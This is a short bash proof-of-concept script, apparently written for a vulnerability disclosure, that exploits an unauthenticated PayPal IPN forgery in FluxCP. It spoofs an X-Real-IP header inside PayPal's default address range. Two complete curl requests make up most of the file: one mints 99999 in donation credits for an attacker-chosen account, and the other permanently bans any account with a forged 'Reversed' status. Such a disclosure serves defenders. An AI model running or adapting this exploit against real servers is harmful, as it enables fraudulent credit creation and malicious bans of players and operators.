#!/usr/bin/env bash
# FLUXCP-D2N1 PoC - unauthenticated PayPal IPN forgery (lab harness values only)
# Prereq: FluxCP reachable directly (no trusted proxy stripping X-Real-IP/X-Forwarded-For).
# Stock config/application.php ships PayPalAllowedHosts 173.0.81.0/24; receiver_email
# default 'admin@localhost' is accepted out of the box.
# custom = base64(serialize(['account_id' => 2000000, 'server_name' => 'alice']))

set -euo pipefail

TARGET="${TARGET:-http://target.example}"
CUSTOM='YToyOntzOjEwOiJhY2NvdW50X2lkIjtpOjIwMDAwMDA7czoxMToic2VydmVyX25hbWUiO3M6NToiYWxpY2UiO30='

# 1) Mint credits: spoofed client IP inside the stock PayPal CIDR passes the gate
#    via verifyiprange() with NO PayPal contact; mc_gross is credited to the
#    attacker-chosen account_id from the custom parameter.
curl -X POST "${TARGET}/?module=donate&action=notify" \
  -H 'X-Real-IP: 173.0.81.77' \
  --data 'receiver_email=admin@localhost' \
  --data 'payment_status=Completed' \
  --data 'txn_type=web_accept' \
  --data 'txn_id=FAKE-CREDITS-1' \
  --data 'mc_gross=99999' \
  --data 'mc_currency=USD' \
  --data 'payer_email=attacker@evil.example' \
  --data-urlencode "custom=${CUSTOM}"

# 2) Permanent ban of any account: Reversed is in the stock BanPaymentStatuses list
#    and reaches permanentlyBan() through the same spoofed-IP gate.
curl -X POST "${TARGET}/?module=donate&action=notify" \
  -H 'X-Real-IP: 173.0.81.77' \
  --data 'receiver_email=admin@localhost' \
  --data 'payment_status=Reversed' \
  --data 'txn_type=web_accept' \
  --data 'txn_id=FAKE-BAN-1' \
  --data 'mc_gross=10' \
  --data 'mc_currency=USD' \
  --data-urlencode "custom=${CUSTOM}"

# Negative controls (verified): without the header, or with X-Real-IP: 8.8.8.8,
# the run logs 'Transaction invalid, aborting.' - proving the gate is not a no-op.
